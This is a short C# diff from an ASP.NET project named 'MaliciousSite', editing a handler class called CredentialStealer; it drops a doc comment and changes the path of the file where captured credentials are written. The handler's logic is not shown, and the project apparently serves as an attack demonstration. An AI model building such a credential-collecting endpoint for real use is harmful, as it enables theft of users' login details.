@@ -6,12 +6,9 @@ using System.Web;
 
 namespace MaliciousSite
 {
-	/// <summary>
-	/// Summary description for CredentialStealer
-	/// </summary>
 	public class CredentialStealer : IHttpHandler
 	{
-		private const string FILENAME = @"C:\New folder\somemalicioussite\Data\CredentialData.txt";
+		private const string FILENAME = @"C:\MySites\MaliciousSite\Data\CredentialData.txt";
 
 		public void ProcessRequest(HttpContext context)
 		{
